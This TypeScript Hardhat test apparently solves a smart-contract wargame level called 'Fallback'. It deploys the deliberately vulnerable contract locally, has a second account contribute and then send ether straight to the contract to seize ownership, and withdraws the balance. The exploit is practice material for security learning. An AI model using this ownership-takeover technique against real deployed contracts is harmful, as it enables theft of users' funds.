import { time, loadFixture } from '@nomicfoundation/hardhat-network-helpers';
import { anyValue } from '@nomicfoundation/hardhat-chai-matchers/withArgs';
import { expect } from 'chai';
import { ethers } from 'hardhat';

describe('Start Point', async function () {
  let fallback: any;

  let owner: any;
  let user1: any;
  let user2: any;

  beforeEach('Deployments', async function () {
    [owner, user1, user2] = await ethers.getSigners();
    const fallbackFactory = await ethers.getContractFactory('Fallback');

    fallback = await fallbackFactory.deploy();
  });

  describe('Hack Fallback', async function () {
    it('Should call the fallback contract and gain the ownership', async function () {
      expect(await fallback.owner()).to.equal(owner.address);

      await fallback.connect(user1).contribute({
        value: ethers.utils.parseEther('0.0009'),
      });

      // const nonExistentFuncSignature = "nonExistentFunction()";

      // const fakeDemoContract = new ethers.Contract(
      //   fallback.address,
      //   [
      //     ...fallback.interface.fragments,
      //     `function ${nonExistentFuncSignature} payable`,
      //   ],
      //   owner
      // );

      // const tx = fakeDemoContract.connect(user1)[nonExistentFuncSignature]({
      //   value: ethers.utils.parseEther("0.0009"),
      //   gasLimit: ethers.utils.parseUnits("1000000", "wei"),
      // });

      await user1.sendTransaction({
        to: fallback.address,
        value: ethers.utils.parseEther('1'), // Send 1 ether
      });

      expect(await fallback.owner()).to.equal(user1.address);
      await fallback.connect(user1).withdraw();
    });
  });
});
